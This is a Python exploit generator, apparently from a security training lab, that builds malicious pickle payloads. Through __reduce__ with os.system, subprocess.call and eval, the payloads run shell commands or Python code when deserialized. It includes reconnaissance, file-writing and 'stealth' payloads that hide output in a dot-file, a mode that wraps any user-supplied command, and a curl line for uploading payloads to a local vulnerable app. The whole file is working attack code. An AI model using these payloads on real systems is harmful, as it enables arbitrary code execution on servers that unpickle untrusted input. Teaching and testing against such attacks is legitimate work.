#!/usr/bin/env python3
"""
Command Execution Pickle Exploit
This script demonstrates how to create malicious pickle payloads that execute
system commands when deserialized.

WARNING: For educational purposes only. Use only on systems you own.
"""

import pickle
import base64
import os
import sys
from pathlib import Path


class CommandExecutionExploit:
    """Demonstrates command execution via pickle deserialization"""

    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        """This method is called during pickling and defines how to reconstruct the object"""
        return (os.system, (self.command,))


class SubprocessExploit:
    """Alternative command execution using subprocess.call"""

    def __init__(self, command_list):
        self.command_list = command_list

    def __reduce__(self):
        import subprocess

        return (subprocess.call, (self.command_list,))


class EvalExploit:
    """Python code execution using eval"""

    def __init__(self, python_code):
        self.python_code = python_code

    def __reduce__(self):
        return (eval, (self.python_code,))


def create_simple_command_payload(command):
    """Create a simple command execution payload"""
    exploit = CommandExecutionExploit(command)
    return pickle.dumps(exploit)


def create_info_gathering_payload():
    """Create a payload that gathers system information"""
    commands = [
        "echo '=== SYSTEM INFORMATION ==='",
        "whoami",
        "id",
        "uname -a",
        "pwd",
        "ls -la",
        "ps aux | head -10",
        "echo '=== END SYSTEM INFO ==='",
    ]

    # Combine commands with semicolons
    combined_command = "; ".join(commands)
    return create_simple_command_payload(combined_command)


def create_file_creation_payload():
    """Create a payload that creates a file with evidence of compromise"""
    command = """
    echo "This file was created by a pickle exploit!" > /tmp/pickle_exploit_proof.txt
    echo "Timestamp: $(date)" >> /tmp/pickle_exploit_proof.txt
    echo "User: $(whoami)" >> /tmp/pickle_exploit_proof.txt
    echo "Directory: $(pwd)" >> /tmp/pickle_exploit_proof.txt
    """
    return create_simple_command_payload(command)


def create_stealth_payload():
    """Create a payload that executes quietly"""
    # This payload runs commands but redirects output to avoid detection
    command = """
    (whoami; id; uname -a; pwd) > /tmp/.hidden_output 2>&1
    """
    return create_simple_command_payload(command)


def create_network_payload():
    """Create a payload that makes network connections"""
    # Ping a local address (safe for demonstration)
    command = "ping -c 3 127.0.0.1 > /tmp/ping_result.txt"
    return create_simple_command_payload(command)


def create_python_code_payload():
    """Create a payload that executes Python code"""
    python_code = """
import os
import sys
print("🐍 Python code executed via pickle!")
print(f"Current user: {os.environ.get('USER', 'unknown')}")
print(f"Python version: {sys.version}")
print(f"Current directory: {os.getcwd()}")
    """
    exploit = EvalExploit(python_code)
    return pickle.dumps(exploit)


def demonstrate_payloads():
    """Demonstrate various command execution payloads"""

    print("⚔️  COMMAND EXECUTION PICKLE EXPLOITS")
    print("=" * 50)
    print("⚠️  WARNING: Educational purposes only!")
    print("   Use only on systems you own or have permission to test.")
    print("=" * 50)

    # Create output directory
    output_dir = (
        Path("../payloads") if Path("../payloads").exists() else Path("payloads")
    )
    output_dir.mkdir(exist_ok=True)

    exploits = [
        (
            "Simple Command",
            create_simple_command_payload("echo 'Hello from pickle exploit!'"),
        ),
        ("Info Gathering", create_info_gathering_payload()),
        ("File Creation", create_file_creation_payload()),
        ("Stealth Operation", create_stealth_payload()),
        ("Network Operation", create_network_payload()),
        ("Python Code Execution", create_python_code_payload()),
    ]

    print("\n📦 GENERATING COMMAND EXECUTION PAYLOADS:")
    print("-" * 45)

    for name, payload in exploits:
        print(f"\n🎯 {name}")

        # Save binary payload
        filename = output_dir / f"cmd_{name.lower().replace(' ', '_')}.pkl"
        with open(filename, "wb") as f:
            f.write(payload)
        print(f"💾 Binary payload: {filename}")

        # Save base64 payload
        b64_payload = base64.b64encode(payload).decode("utf-8")
        b64_filename = output_dir / f"cmd_{name.lower().replace(' ', '_')}_base64.txt"
        with open(b64_filename, "w") as f:
            f.write(b64_payload)
        print(f"📄 Base64 payload: {b64_filename}")
        print(f"📏 Size: {len(payload)} bytes / {len(b64_payload)} base64 chars")
        print(f"🔍 Preview: {b64_payload[:60]}...")

    print(f"\n✅ All command execution payloads saved to '{output_dir}'")

    # Demonstrate manual testing
    print("\n🧪 MANUAL TESTING:")
    print("1. Start the vulnerable app: python vulnerable_app.py")
    print("2. Use curl to test:")
    print(
        "   curl -X POST -F 'pickle_file=@payloads/cmd_simple_command.pkl' http://127.0.0.1:5000/process_pickle"
    )
    print("3. Or paste base64 content in the web interface")

    print("\n🔍 DETECTION TIPS:")
    print("- Monitor for unexpected process executions")
    print("- Check for new files in /tmp/")
    print("- Watch for unusual network activity")
    print("- Monitor system calls from Python processes")


def create_targeted_payload(target_command):
    """Create a payload for a specific command"""
    if not target_command:
        print("❌ No command provided")
        return None

    print(f"🎯 Creating payload for command: {target_command}")
    payload = create_simple_command_payload(target_command)
    b64_payload = base64.b64encode(payload).decode("utf-8")

    print(f"📦 Binary size: {len(payload)} bytes")
    print(f"📄 Base64 payload:")
    print(b64_payload)

    return payload


def main():
    """Main function"""
    if len(sys.argv) > 1:
        if sys.argv[1] == "--help":
            print("Command Execution Pickle Exploit Generator")
            print("\nUsage:")
            print(
                "  python command_execution.py                 # Generate all payloads"
            )
            print(
                "  python command_execution.py 'your_command'  # Create custom payload"
            )
            print("\nExamples:")
            print("  python command_execution.py 'whoami'")
            print("  python command_execution.py 'ls -la'")
            print("  python command_execution.py 'echo test > /tmp/test.txt'")
        else:
            # Create custom payload
            create_targeted_payload(" ".join(sys.argv[1:]))
    else:
        # Run full demonstration
        demonstrate_payloads()


if __name__ == "__main__":
    main()
